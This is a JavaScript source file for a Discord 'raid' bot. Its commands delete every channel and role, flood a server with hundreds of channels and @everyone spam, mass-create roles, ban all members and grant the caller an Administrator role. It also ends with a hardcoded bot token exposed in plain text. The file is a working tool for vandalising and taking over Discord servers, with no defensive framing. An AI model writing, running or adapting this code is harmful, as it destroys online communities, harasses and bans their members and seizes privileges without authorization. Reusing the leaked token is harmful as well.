const Discord = require("discord.js");
const client = new Discord.Client();

client.on("ready", () => {
    console.log(`%c Bot raid iniciando...`, `color: #bada55`);
    console.log(`Commands:

    $nuker - Elimina todos los canales
    $banall - Banea a todos
    $raid - Raidea el servidor creando canales
    $admin - Consigue administrado
    $deleterole - Elimina todos los roles
    $roles - Spam roles

    $help - Para ayuda [En el servidor (Discord)]

    Created by Barack Obama#1843
  `);
    presencia();  
    });



function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "Owner | Barack Obama#1843",
  type: "STREAMING"

}
  });
}

client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '$nuker') {
    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Raided lmao.`, {
          type: 'text'
        }).then(channel => {
          channel.send("https://api.creavite.co/out/2560dce9-b7a5-49f8-8b9f-0de2e9d70c32_standard.gif")
        })
         }
      })


client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === '$raid') {
            message.delete()
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`Raided by Barack Obama#1843`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone RaidByBarack Obama  ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ")
              channel.send("@everyone RaidByhashes#1843 ");
              channel.send("@everyone RaidByhashes#1843 ");
              channel.send("@everyone RaidByhashes#1843 ");
              channel.send("@everyone RaidByhashes#1843 ");
              channel.send("@everyone RaidByhashes#1843 ");
                  
              })
              }
              }
            });

client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === ('$deleterole')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });



client.on("message", message => {
                if (message.author.bot) return;
              
               if (message.content === '$roles') {
                message.delete()
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `RaidByhashes`,color: '#d41818',},reason: 'razon',})
              };
               }
                });



client.on("message", message => {
    if (message.author.bot) return;
  
    if (message.content === '$banall') {
    message.delete()
    message.guild.members.cache.forEach(m => {
    m.ban()
    });
  }
}); 


client.on("message", async msg => {
  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith('$admin')){
    let rol = await msg.guild.roles.create({data: {
      name: "Admin",
      color: "060606",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});

client.on('message', message => {
  if (message.content === '$help') {
    const embed = new Discord.MessageEmbed()

      .setAuthor('Created By Hashes')
   
      .setTitle('$help de Hackong')


      .setColor(0xff0000)

      .setThumbnail('https://api.creavite.co/out/2560dce9-b7a5-49f8-8b9f-0de2e9d70c32_standard.gif')

      .setDescription(`
      
      $nuker - Elimina todos los canales
      $banall - Banea a todos
      $raid - Raidea el servidor creando canales
      $admin - Consigue administrado
      $deleterole - Elimina todos los roles
      $roles - Spam roles
      
      
      `);

    message.channel.send(embed);
  }
});

 client.login("ODMwMjUxMjE1NjU2NzE0MzEw.YHD9sw.QCoIVGLXLtrn0vZVsh5Bi_wexWg");